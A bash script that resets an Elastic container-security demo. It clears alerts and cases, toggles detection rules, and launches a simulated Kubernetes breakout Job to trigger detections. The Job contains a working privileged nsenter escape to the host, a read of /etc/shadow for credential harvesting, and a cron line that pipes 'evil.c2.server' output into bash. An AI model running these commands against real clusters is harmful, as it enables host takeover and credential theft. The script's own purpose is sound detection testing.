#!/bin/bash
################################################################################
# D4C2 Demo - Reset and Run
#
# Resets the demo environment and runs the attack, ending with 2 alerts:
#   1. Cleans up previous K8s attack jobs
#   2. Disables detection rules (prevents re-firing during cleanup)
#   3. Deletes Elastic Security alerts
#   4. Re-enables detection rules (resets suppression windows)
#   5. Deletes Elastic Security cases
#   6. Verifies readiness (agents healthy, events flowing)
#   7. Runs container breakout attack (nsenter escape + credential harvesting)
#   8. Waits for and verifies 2 alerts appear in the Security UI
#
# Usage:
#   ./scripts/reset-demo.sh
################################################################################

set -e

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
PURPLE='\033[0;35m'
NC='\033[0m'

print_info()  { echo -e "${GREEN}[INFO]${NC} $1"; }
print_warn()  { echo -e "${YELLOW}[WARN]${NC} $1"; }
print_error() { echo -e "${RED}[ERROR]${NC} $1"; }
print_phase() {
    echo -e "\n${PURPLE}========================================${NC}"
    echo -e "${PURPLE} $1${NC}"
    echo -e "${PURPLE}========================================${NC}\n"
}

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

################################################################################
# STEP 1: Read terraform outputs
################################################################################

print_phase "STEP 1: Reading Terraform outputs"

KIBANA_URL=$(terraform -chdir="${PROJECT_DIR}/infra" output -raw kibana_url)
ES_URL=$(terraform -chdir="${PROJECT_DIR}/infra" output -raw elasticsearch_url)
ES_PASSWORD=$(terraform -chdir="${PROJECT_DIR}/infra" output -raw elasticsearch_password)
CONTROL_IP=$(terraform -chdir="${PROJECT_DIR}/infra" output -raw control_plane_public_ip)
SSH_KEY="${PROJECT_DIR}/d4c2-key.pem"

print_info "Kibana:  $KIBANA_URL"
print_info "Control: $CONTROL_IP"

RULE_NAME_CRYPTO="Crypto Miner Detected (xmrig in /tmp)"
RULE_NAME_NODE="Container Breakout via nsenter (Node-Level Escape)"
RULE_NAME_CRED="Sensitive File Access from Container (Credential Harvesting)"

################################################################################
# STEP 2: Clean up K8s attack job
################################################################################

print_phase "STEP 2: Cleaning up attack jobs"

ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no ubuntu@${CONTROL_IP} \
    "kubectl delete job crypto-miner-sim node-breakout-sim --ignore-not-found=true" 2>&1 || true
print_info "Attack jobs cleaned up."

################################################################################
# STEP 3: Disable detection rule (MUST happen before deleting alerts,
#          otherwise the still-running rule re-fires and recreates them)
################################################################################

print_phase "STEP 3: Disabling detection rules"

# Fetch all rules once
ALL_RULES=$(curl -s \
    -u "elastic:${ES_PASSWORD}" \
    -H "kbn-xsrf: true" \
    -H "elastic-api-version: 2023-10-31" \
    "${KIBANA_URL}/api/detection_engine/rules/_find?per_page=100" 2>/dev/null)

RULE_ID_CRYPTO=$(echo "$ALL_RULES" | jq -r ".data[] | select(.name==\"${RULE_NAME_CRYPTO}\") | .id" 2>/dev/null)
RULE_ID_NODE=$(echo "$ALL_RULES" | jq -r ".data[] | select(.name==\"${RULE_NAME_NODE}\") | .id" 2>/dev/null)
RULE_ID_CRED=$(echo "$ALL_RULES" | jq -r ".data[] | select(.name==\"${RULE_NAME_CRED}\") | .id" 2>/dev/null)

for RULE_PAIR in "${RULE_NAME_CRYPTO}|${RULE_ID_CRYPTO}" "${RULE_NAME_NODE}|${RULE_ID_NODE}" "${RULE_NAME_CRED}|${RULE_ID_CRED}"; do
    RNAME="${RULE_PAIR%%|*}"
    RID="${RULE_PAIR##*|}"
    if [ -n "$RID" ] && [ "$RID" != "null" ]; then
        print_info "Disabling detection rule '${RNAME}'..."
        curl -s \
            -u "elastic:${ES_PASSWORD}" \
            -X PATCH \
            -H "kbn-xsrf: true" \
            -H "elastic-api-version: 2023-10-31" \
            -H "Content-Type: application/json" \
            "${KIBANA_URL}/api/detection_engine/rules" \
            -d "{\"id\": \"${RID}\", \"enabled\": false}" > /dev/null 2>&1
        print_info "Disabled '${RNAME}'."
    else
        print_warn "Detection rule '${RNAME}' not found — skipping."
    fi
done

# Wait for rule execution intervals to drain
print_info "Waiting for rule execution intervals to drain..."
sleep 5

################################################################################
# STEP 4: Delete Elastic Security alerts (rule is now disabled so they
#          won't be recreated)
################################################################################

print_phase "STEP 4: Clearing Elastic Security alerts"

print_info "Deleting alerts for all demo rules..."
DELETE_RESPONSE=$(curl -s \
    -u "elastic:${ES_PASSWORD}" \
    -X POST \
    -H "Content-Type: application/json" \
    "${ES_URL}/.alerts-security.alerts-default/_delete_by_query?refresh=true" \
    -d "{
        \"query\": {
            \"bool\": {
                \"should\": [
                    {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_CRYPTO}\"}},
                    {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_NODE}\"}},
                    {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_CRED}\"}}
                ],
                \"minimum_should_match\": 1
            }
        }
    }" 2>&1)

DELETED=$(echo "$DELETE_RESPONSE" | jq -r '.deleted // 0' 2>/dev/null)
FAILURES=$(echo "$DELETE_RESPONSE" | jq -r '.failures | length // 0' 2>/dev/null)

if [ "$DELETED" -gt 0 ] 2>/dev/null; then
    print_info "Deleted ${DELETED} alert(s)."
elif echo "$DELETE_RESPONSE" | jq -e '.error' > /dev/null 2>&1; then
    ES_ERROR=$(echo "$DELETE_RESPONSE" | jq -r '.error.type // .error.reason // "unknown"' 2>/dev/null)
    print_warn "Direct delete failed (${ES_ERROR}). Closing alerts via Kibana API..."

    curl -s \
        -u "elastic:${ES_PASSWORD}" \
        -X POST \
        -H "kbn-xsrf: true" \
        -H "Content-Type: application/json" \
        "${KIBANA_URL}/api/detection_engine/signals/status" \
        -d "{
            \"query\": {
                \"bool\": {
                    \"filter\": [
                        {\"bool\": {
                            \"should\": [
                                {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_CRYPTO}\"}},
                                {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_NODE}\"}},
                                {\"term\": {\"kibana.alert.rule.name\": \"${RULE_NAME_CRED}\"}}
                            ],
                            \"minimum_should_match\": 1
                        }}
                    ]
                }
            },
            \"status\": \"closed\"
        }" > /dev/null 2>&1

    print_info "Alerts closed via Kibana API."
else
    print_info "No alerts found to delete."
fi

if [ "$FAILURES" -gt 0 ] 2>/dev/null; then
    print_warn "${FAILURES} alert(s) failed to delete — check index permissions."
fi

################################################################################
# STEP 5: Re-enable detection rule (resets alert suppression window)
################################################################################

print_phase "STEP 5: Re-enabling detection rule"

for RULE_PAIR in "${RULE_NAME_CRYPTO}|${RULE_ID_CRYPTO}" "${RULE_NAME_NODE}|${RULE_ID_NODE}" "${RULE_NAME_CRED}|${RULE_ID_CRED}"; do
    RNAME="${RULE_PAIR%%|*}"
    RID="${RULE_PAIR##*|}"
    if [ -n "$RID" ] && [ "$RID" != "null" ]; then
        print_info "Re-enabling '${RNAME}'..."
        curl -s \
            -u "elastic:${ES_PASSWORD}" \
            -X PATCH \
            -H "kbn-xsrf: true" \
            -H "elastic-api-version: 2023-10-31" \
            -H "Content-Type: application/json" \
            "${KIBANA_URL}/api/detection_engine/rules" \
            -d "{\"id\": \"${RID}\", \"enabled\": true}" > /dev/null 2>&1
        print_info "Re-enabled '${RNAME}' (suppression window reset)."
    else
        print_warn "No rule '${RNAME}' to re-enable — skipping."
    fi
done

################################################################################
# STEP 6: Delete Elastic Security cases
################################################################################

print_phase "STEP 6: Clearing Elastic Security cases"

CASE_IDS=$(curl -s \
    -u "elastic:${ES_PASSWORD}" \
    -H "kbn-xsrf: true" \
    "${KIBANA_URL}/api/cases/_find?perPage=100" 2>/dev/null \
    | jq -r '.cases[]?.id // empty' 2>/dev/null || echo "")

if [ -z "$CASE_IDS" ]; then
    print_info "No cases found."
else
    IDS_JSON=$(echo "$CASE_IDS" | jq -R . | jq -s -c .)
    IDS_ENCODED=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "$IDS_JSON")
    COUNT=$(echo "$CASE_IDS" | wc -l | tr -d ' ')
    print_info "Deleting ${COUNT} case(s)..."

    HTTP_CODE=$(curl -s \
        -u "elastic:${ES_PASSWORD}" \
        -X DELETE \
        -H "kbn-xsrf: true" \
        -o /dev/null -w "%{http_code}" \
        "${KIBANA_URL}/api/cases?ids=${IDS_ENCODED}" 2>/dev/null)

    if [ "$HTTP_CODE" = "204" ]; then
        print_info "Deleted ${COUNT} case(s)."
    else
        print_warn "Case deletion returned HTTP ${HTTP_CODE}."
    fi
fi

################################################################################
# STEP 7: Verify readiness
################################################################################

print_phase "STEP 7: Verifying readiness"

# Check Fleet agents are healthy
print_info "Checking Fleet agents..."
AGENT_COUNT=$(curl -s \
    -u "elastic:${ES_PASSWORD}" \
    -H "kbn-xsrf: true" \
    "${KIBANA_URL}/api/fleet/agents" 2>/dev/null \
    | jq '[.items[] | select(.status=="online")] | length' 2>/dev/null || echo "0")
print_info "Online agents: $AGENT_COUNT"

# Check cloud_defend events are flowing
print_info "Checking for recent D4C process events..."
COUNT=$(curl -s \
    -u "elastic:${ES_PASSWORD}" \
    -H "Content-Type: application/json" \
    "${ES_URL}/logs-cloud_defend.process-default*/_count" \
    -d '{
        "query": {
            "range": {
                "@timestamp": {"gte": "now-2m"}
            }
        }
    }' 2>/dev/null | jq -r '.count // 0' 2>/dev/null)

if [ "$COUNT" -gt 0 ] 2>/dev/null; then
    print_info "Found $COUNT D4C process events in last 2 minutes — collection active."
else
    print_warn "No recent D4C process events — agent may need a moment."
fi

################################################################################
# STEP 8: Run container breakout attack
################################################################################

print_phase "STEP 8: Running container breakout attack"

# Create the breakout job manifest
cat <<'JOBEOF' > /tmp/node-breakout-job.yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: node-breakout-sim
  namespace: default
spec:
  ttlSecondsAfterFinished: 300
  template:
    spec:
      hostPID: true
      containers:
      - name: breakout
        image: ubuntu:22.04
        command: ["/bin/bash", "-c"]
        args:
          - |
            echo "=== Stage 1: Container escape via nsenter ==="
            nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash -c '
              echo "=== Stage 2: Host reconnaissance ==="
              whoami
              hostname
              uname -a
              cat /etc/os-release
              ip addr show 2>/dev/null || ifconfig 2>/dev/null

              echo "=== Stage 3: Credential harvesting ==="
              cat /etc/shadow

              echo "=== Stage 4: Persistence ==="
              echo "* * * * * root curl -s http://evil.c2.server/beacon | bash" > /tmp/.hidden-cron
              echo "Backdoor cron installed at /tmp/.hidden-cron"
            '
            echo "Container breakout simulation complete"
            sleep 60
        securityContext:
          privileged: true
      restartPolicy: Never
  backoffLimit: 0
JOBEOF

scp -i "$SSH_KEY" -o StrictHostKeyChecking=no \
  /tmp/node-breakout-job.yaml ubuntu@${CONTROL_IP}:/tmp/

ssh -i "$SSH_KEY" -o StrictHostKeyChecking=no ubuntu@${CONTROL_IP} \
  "kubectl apply -f /tmp/node-breakout-job.yaml"

print_info "Container breakout job deployed."

################################################################################
# STEP 9: Wait for alerts
################################################################################

print_phase "STEP 9: Waiting for detection alerts"

EXPECTED_ALERTS=2
MAX_WAIT=120
WAITED=0

while true; do
    ALERT_COUNT=$(curl -s \
        -u "elastic:${ES_PASSWORD}" \
        -H "Content-Type: application/json" \
        "${ES_URL}/.alerts-security.alerts-default/_count" \
        -d '{
            "query": {
                "bool": {
                    "must": [
                        {"term": {"kibana.alert.workflow_status": "open"}},
                        {"range": {"@timestamp": {"gte": "now-5m"}}}
                    ]
                }
            }
        }' 2>/dev/null | jq -r '.count // 0' 2>/dev/null)

    if [ "$ALERT_COUNT" -ge "$EXPECTED_ALERTS" ] 2>/dev/null; then
        print_info "Got ${ALERT_COUNT} alert(s) — detection confirmed!"
        break
    fi

    if [ "$WAITED" -ge "$MAX_WAIT" ]; then
        print_warn "Timed out after ${MAX_WAIT}s with ${ALERT_COUNT}/${EXPECTED_ALERTS} alerts."
        break
    fi

    echo "  Waiting for alerts... ${ALERT_COUNT}/${EXPECTED_ALERTS} (${WAITED}s / ${MAX_WAIT}s)"
    sleep 10
    WAITED=$((WAITED + 10))
done

################################################################################
# STEP 10: Verify alerts
################################################################################

print_phase "STEP 10: Verifying alerts"

ALERT_NAMES=$(curl -s \
    -u "elastic:${ES_PASSWORD}" \
    -H "Content-Type: application/json" \
    "${ES_URL}/.alerts-security.alerts-default/_search" \
    -d '{
        "query": {
            "bool": {
                "must": [
                    {"term": {"kibana.alert.workflow_status": "open"}},
                    {"range": {"@timestamp": {"gte": "now-5m"}}}
                ]
            }
        },
        "size": 10,
        "_source": ["kibana.alert.rule.name", "kibana.alert.severity"]
    }' 2>/dev/null | jq -r '.hits.hits[]._source | "\(.["kibana.alert.severity"]): \(.["kibana.alert.rule.name"])"' 2>/dev/null)

if [ -n "$ALERT_NAMES" ]; then
    echo "$ALERT_NAMES" | while read -r line; do
        print_info "  $line"
    done
else
    print_warn "No alerts found — check rule configuration."
fi

################################################################################
# Done
################################################################################

print_phase "Demo Reset Complete"

print_info "Alerts visible at: ${KIBANA_URL}/app/security/alerts"
echo ""
